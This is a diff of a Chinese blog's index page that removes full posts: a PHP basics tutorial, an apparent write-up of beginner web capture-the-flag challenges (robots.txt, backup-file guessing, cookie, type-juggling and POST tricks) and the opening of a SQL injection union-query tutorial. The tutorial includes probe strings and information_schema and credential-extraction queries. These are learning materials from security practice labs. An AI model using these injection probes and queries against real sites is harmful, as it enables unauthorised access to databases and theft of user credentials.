-<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-6E" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-61" x="600" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6D" x="1130" y="0"></use>
- <use xlink:href="#E1-MJMATHI-65" x="2008" y="0"></use>
- <use xlink:href="#E1-MJMAIN-2C" x="2475" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6D" x="2920" y="0"></use>
- <use xlink:href="#E1-MJMATHI-69" x="3798" y="0"></use>
- <use xlink:href="#E1-MJMATHI-78" x="4144" y="0"></use>
- <use xlink:href="#E1-MJMATHI-65" x="4716" y="0"></use>
- <use xlink:href="#E1-MJMATHI-64" x="5183" y="0"></use>
-</g>
-</svg>value [, bool $case_insensitive &#x3D; false ] )<br></code></pre></td></tr></table></figure>
-<p>该函数有三个参数:</p>
-<ul>
-<li>name：必选参数，常量名称，即标志符。</li>
-<li>value：必选参数，常量的值。</li>
-<li>case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</li>
-</ul>
-<p>以下我们设置一个区别大小写以及不区别的常量实例进行说明：<br><strong>这是有区别的！</strong><br><img  src="https://img-blog.csdnimg.cn/20210227164854725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>额..这里报错是因为大小写是有区别的是两个不同的变量而<code>willian</code>起初是没有被定义的。<br><strong>没有区别</strong><br><img  src="https://img-blog.csdnimg.cn/20210227165150638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>是不是多了一个参数</p>
-<p>在常量的起初我们已经说过了常量是在全局都可以使用的下面我们来展示一下：<br><img  src="https://img-blog.csdnimg.cn/20210227165612255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>大家看即便是定义的函数内部变量但仍可以使用这是因为已经定义过的变量在全局中都可以使用。</p>
-<h1 id="五-字符串变量"><a href="#五-字符串变量" class="headerlink" title="五.字符串变量"></a>五.字符串变量</h1><p>字符串变量用于包含有字符的值。</p>
-<p>在创建字符串之后，我们就可以对它进行操作了。您可以直接在函数中使用字符串，或者把它存储在变量中。<br>比如呢：<img  src="https://img-blog.csdnimg.cn/20210227170136361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>现在，让我们来看看一些常用的操作字符串的函数和运算符。</p>
-<p><strong>并置运算符</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">并置运算符 (.) 用于把两个字符串值连接起来。<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210227170507624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>这里我在两个字符串之间连接了一个空格便于查看，因此使用了两次运算符<br><strong>strpos() 函数</strong><br>trpos() 函数用于在字符串内查找一个字符或一段指定的文本。</p>
-<p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<br><img  src="https://img-blog.csdnimg.cn/20210227171009611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>提示</strong>：在上面的实例中，字符串 “world” 的位置是 6。之所以是 6 而不是 7 的原因是，字符串中第一个字符的位置是 0，而不是 1。</p>
-<p><strong>strlen() 函数</strong><br>strlen() 函数返回字符串的长度（字节数）。</p>
-<p><img  src="https://img-blog.csdnimg.cn/20210227171230962.png"  ><span class="image-caption">在这里插入图片描述</span><br><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-ref-string.html">这里查看更多字符串函数</a></p>
-<h1 id="六-运算符"><a href="#六-运算符" class="headerlink" title="六.运算符"></a>六.运算符</h1><p><strong>算术运算符</strong><br><img  src="https://img-blog.csdnimg.cn/2021022717412920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>这里举例一个特殊的：取反<br><img  src="https://img-blog.csdnimg.cn/20210227174309298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>赋值运算符</strong><br><img  src="https://img-blog.csdnimg.cn/20210227174352747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs plain">$x&#x3D;10;<br>echo $x;<br>echo &quot;&lt;br&gt;&quot;;<br><br>$y&#x3D;20;<br>$y+&#x3D;200;<br>echo $y;<br>echo &quot;&lt;br&gt;&quot;; 加法<br><br>$z&#x3D;50;<br>$z-&#x3D;25;<br>echo $z;<br>echo &quot;&lt;br&gt;&quot;;减法<br><br>$i&#x3D;5;<br>$i*&#x3D;6;<br>echo $i;<br>echo &quot;&lt;br&gt;&quot;;乘法<br><br>$j&#x3D;10;<br>$j&#x2F;&#x3D;5;<br>echo $j;<br>echo &quot;&lt;br&gt;&quot;;除法<br><br>$k&#x3D;15;<br>$k%&#x3D;4;<br>echo $k;求余<br><br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210227174927208.png"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p> <strong>递增/递减运算符</strong><br>  <img  src="https://img-blog.csdnimg.cn/20210227175053881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210227175358399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>比较运算符</strong><br><img  src="https://img-blog.csdnimg.cn/20210227175433174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>举例说明：<img  src="https://img-blog.csdnimg.cn/20210227175829495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p> <strong>逻辑运算符</strong><br> <img  src="https://img-blog.csdnimg.cn/20210227175910314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>数组运算符</strong><br><img  src="https://img-blog.csdnimg.cn/20210227180036902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210227180444830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="七-If…Else-语句"><a href="#七-If…Else-语句" class="headerlink" title="七.If…Else 语句"></a>七.If…Else 语句</h1><p>在 PHP 中，提供了下列条件语句：</p>
-<ul>
-<li>if 语句 - 在条件成立时执行代码</li>
-<li>if…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码</li>
-<li>if…elseif….else 语句 - 在若干条件之一成立时执行一个代码块</li>
-<li>switch 语句 - 在若干条件之一成立时执行一个代码块</li>
-</ul>
-<p> <strong>if 语句</strong><br> if 语句用于仅当指定条件成立时执行代码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">if (条件)<br>&#123;<br>    条件成立时要执行的代码;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p> <img  src="https://img-blog.csdnimg.cn/20210227181215905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>if…else 语句</strong><br>在条件成立时执行一块代码，条件不成立时执行另一块代码，请使用 if….else 语句。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">if (条件)<br>&#123;<br>条件成立时执行的代码;<br>&#125;<br>else<br>&#123;<br>条件不成立时执行的代码;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>如果t小于20则输出第一句否则输出第二句<br><img  src="https://img-blog.csdnimg.cn/20210227181402236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br> <strong>if…elseif….else 语句</strong><br> 在若干条件之一成立时执行一个代码块，请使用 if….elseif…else 语句。.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">if (条件)<br>&#123;<br>    if 条件成立时执行的代码;<br>&#125;<br>elseif (条件)<br>&#123;<br>    elseif 条件成立时执行的代码;<br>&#125;<br>else<br>&#123;<br>    条件不成立时执行的代码;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>如果时间小于10则输出第一句如果时间大于10且小于20则输出第二局，否则时间大于20则输出第三局<br><img  src="https://img-blog.csdnimg.cn/20210227181908972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>Switch 语句</strong><br>如果您希望有选择地执行若干代码块之一，请使用 switch 语句。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br>switch (n)<br>&#123;<br>case label1:<br>    如果 n&#x3D;label1，此处代码将执行;<br>    break;<br>case label2:<br>    如果 n&#x3D;label2，此处代码将执行;<br>    break;<br>default:<br>    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210227182855761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-
-      
+<article class="list">
+    <div class="list-time">
+        <a href="/2021/06/05/PHP%E5%85%A5%E9%97%A8%E9%98%B6%E6%AE%B5%E5%AD%A6%E4%B9%A0(%E4%B8%80)/">
+            2021-06-05
+        </a>
+    </div>
+    <div class="list-title">
+        <a href="/2021/06/05/PHP%E5%85%A5%E9%97%A8%E9%98%B6%E6%AE%B5%E5%AD%A6%E4%B9%A0(%E4%B8%80)/">
+            PHP入门学习阶段（一）
+        </a>
     </div>
 </article>
 
-    </li>
-  
-    <li>
-      <article class='ListView'>
-    <header class="title">
-      
-        <h1>
-          <a href="/2021/06/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web(%E6%96%B0%E6%89%8B%E5%8C%BA)%E7%BB%83%E4%B9%A0%E9%A2%98/">攻防世界-新手区Wbe题</a>
-        </h1>
-      
-      <div class='ListMeta'>
-  <time datetime="2021-06-05T07:47:55.188Z" itemprop="datePublished">
-    2021-06-05
-  </time>
-  
-  
-</div>
-
-    </header>
-    <div>
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这里记录了我对于学习攻防世界-新手区Wbe题的总结。</p>
-<h1 id="一、view-source"><a href="#一、view-source" class="headerlink" title="一、view_source"></a>一、view_source</h1><p><img  src="https://img-blog.csdnimg.cn/20210221160121973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>该题通过提示可以看出需要查看网页源代码，但是采用右键的方式无法使用因此可以使用F12进行查看。<br><img  src="https://img-blog.csdnimg.cn/20210221160253865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="二、robots"><a href="#二、robots" class="headerlink" title="二、robots"></a>二、robots</h1><p><img  src="https://img-blog.csdnimg.cn/20210221160942365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>该题的关键是<code>robots</code>,通过查阅发现：<br>robots协议即为：robots.txt<img  src="https://img-blog.csdnimg.cn/20210221161236660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>因此需要在url后添加：robots.txt<br><img  src="https://img-blog.csdnimg.cn/20210221161327354.png"  ><span class="image-caption">在这里插入图片描述</span><br>根据提示将添加内容改为：f1ag_1s_h3re.php得到flag<br><img  src="https://img-blog.csdnimg.cn/20210221161759916.png"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="三-backup"><a href="#三-backup" class="headerlink" title="三.backup"></a>三.backup</h1><p><img  src="https://img-blog.csdnimg.cn/20210221161918336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>打开题目场景<img  src="https://img-blog.csdnimg.cn/20210221162219661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>这个…需要上网查阅：<br> 常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” 尝试在URL后面，依次输入常见的文件备份扩展名。</p>
-<p>  当输入.bak即<code>http://111.200.241.244:40794/index.php.bak</code>后会下载一个文件打开文件得到flag<img  src="https://img-blog.csdnimg.cn/20210221162603220.png"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="四-cookie"><a href="#四-cookie" class="headerlink" title="四.cookie"></a>四.cookie</h1><p><img  src="https://img-blog.csdnimg.cn/20210221162727825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>了解一下：<img  src="https://img-blog.csdnimg.cn/20210222145945679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>打开后无任何提示，我们这里用Burp就行抓包<br><img  src="https://img-blog.csdnimg.cn/20210222151103745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>URL后中打开cookie.php<br><img  src="https://img-blog.csdnimg.cn/20210222151309804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p>打开开发者模式进行查看响应头得到flag：<br><img  src="https://img-blog.csdnimg.cn/20210222151556220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="五-disabled-button"><a href="#五-disabled-button" class="headerlink" title="五.disabled_button"></a>五.disabled_button</h1><p><img  src="https://img-blog.csdnimg.cn/20210221182241924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>通过题目的可以想到在HTML标签中的disabled属性：<br>disabled 属性规定应该禁用 input 元素。</p>
-<p>被禁用的 input 元素既不可用，也不可点击。可以设置 disabled 属性，直到满足某些其他的条件为止（比如选择了一个复选框等等）。然后，就需要通过 JavaScript 来删除 disabled 值，将 input 元素的值切换为可用。</p>
-<p>注释：disabled 属性无法与 <input type="hidden"> 一起使用。<br>因此打开网页源码找到<code>disabled</code>字样删除即可点击按钮得到flag<br><img  src="https://img-blog.csdnimg.cn/20210221183228252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="六-simple-php"><a href="#六-simple-php" class="headerlink" title="六.simple_php"></a>六.simple_php</h1><p><img  src="https://img-blog.csdnimg.cn/20210222153731810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>根据题目提示本题考验的是简单的php运用<br><img  src="https://img-blog.csdnimg.cn/2021022215400679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>对源码分析，该题以GeT传入参数a和b。对上半段分析<br>：a的参数等于0并且a为真；对下半段进行分析：b的参数必须大于1234因此得到命令：<code>?a=00a&amp;&amp;b=12345b</code>在URL后添加得到flag：<img  src="https://img-blog.csdnimg.cn/20210222160835556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="七-get-post"><a href="#七-get-post" class="headerlink" title="七.get_post"></a>七.get_post</h1><p><img  src="https://img-blog.csdnimg.cn/20210222170019500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>对题目进行解析，http通常由两种请求方式：GET还有post。<br><img  src="https://img-blog.csdnimg.cn/20210222170226233.png"  ><span class="image-caption">在这里插入图片描述</span><br>首先需要在进行get请求只需要在URl后添加上<code>？a=1</code><br><img  src="https://img-blog.csdnimg.cn/20210222170606821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>采用post请求我们可以使用插件HackBar V2，只需要下载便可以使用。<br>安装完成后重启打开HackBar V2插件<br><img  src="https://img-blog.csdnimg.cn/20210222170933448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>第一行复制此刻网页地址：<code>http://111.200.241.244:52052/?a=1</code><br>选择post data<br>下一框根据提示输入b=2即可点击执行得到flag<br><img  src="https://img-blog.csdnimg.cn/20210222171135102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-
-      
+<article class="list">
+    <div class="list-time">
+        <a href="/2021/06/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web(%E6%96%B0%E6%89%8B%E5%8C%BA)%E7%BB%83%E4%B9%A0%E9%A2%98/">
+            2021-06-05
+        </a>
+    </div>
+    <div class="list-title">
+        <a href="/2021/06/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web(%E6%96%B0%E6%89%8B%E5%8C%BA)%E7%BB%83%E4%B9%A0%E9%A2%98/">
+            攻防世界-新手区Wbe题
+        </a>
     </div>
 </article>
 
-    </li>
-  
-    <li>
-      <article class='ListView'>
-    <header class="title">
-      
-        <h1>
-          <a href="/2021/02/05/SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/">SQL注入-联合查询入门</a>
-        </h1>
-      
-      <div class='ListMeta'>
-  <time datetime="2021-02-05T09:18:57.446Z" itemprop="datePublished">
-    2021-02-05
-  </time>
-  
-  
-</div>
-
-    </header>
-    <div>
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>联合查询：<br>一：按照注入语法分为:联合查询注入Union/报错查询注入error/布尔型注入Boolean/延时注入Time/堆叠查询注入</p>
-<p>二：联合查询注入是最简单的一种注入方式,但是要求页面必须有显示位.否则无法注入.</p>
-<p>显示位:可以理解为从数据库提取的数据被显示在前端. 如果没有显示位,我们无法查看注入的结果.</p>
-<p>三：联合查询一般步骤：<br>1、判断注入点还是整形或字符型<br>2、判断查询列数<br>3、判断显示位<br>4、获取所有数据库名<br>5、获取数据库所有表名<br>6、获取字段名<br>7、获取字段中的数据</p>
-<p>在这里我们通过举例第一关来讲解<br>开始前我们需要掌握Mysql必会查询的语句：</p>
-<ol>
-<li>   select database();  #查看当前库名;</li>
-<li>   select table_name from information_schema.tables where     table_schema=database()  ;  #查看当前库下的表名</li>
-<li>   select column_name from information_schema.columns where table_schema=database() and table_name=’user’;  #查询列名</li>
-<li>   select name,password from user;   #获取用户名和密码列<h1 id="一、判断注入点还是整形或字符型"><a href="#一、判断注入点还是整形或字符型" class="headerlink" title="一、判断注入点还是整形或字符型"></a>一、判断注入点还是整形或字符型</h1>在sql变量后添加以下内容来判断类型：</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> / <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> 回显页面不同(整形判断) <br></code></pre></td></tr></table></figure>
